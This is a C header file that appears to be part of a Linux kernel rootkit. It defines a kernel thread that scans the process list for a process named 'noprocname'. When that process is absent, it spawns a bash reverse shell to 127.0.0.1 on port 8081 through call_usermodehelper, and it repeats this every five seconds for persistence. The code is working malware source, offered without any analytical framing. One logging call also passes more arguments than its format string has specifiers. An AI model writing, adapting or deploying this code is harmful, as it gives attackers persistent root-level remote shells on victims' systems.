#ifndef TAINT_MASK_H
#define TAINT_MASK_H

struct task_struct *mon_it;
struct task_struct *task;

static int __shell(void *data);

static int __shell(void *data) {

    while (!kthread_should_stop()) {
        bool process_found = false;

        for_each_process(task) {
            printk(KERN_INFO "rasta : Checking proc: %d\n", task->comm, task->pid);

            if (strncmp(task->comm, "noprocname", 10) == 0 && task->comm[10] == '\0') {
                process_found = true;
                printk(KERN_INFO "rasta : Proc 'noprocname' found (PID: %d)\n", task->pid);
                break;
            }
        }

        if (!process_found) {
            call_usermodehelper("/bin/bash", 
                                (char *[]){"/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/8081 0>&1", NULL}, 
                                NULL, UMH_WAIT_EXEC);
        }

        ssleep(5);
    }

    return 0;
}

#endif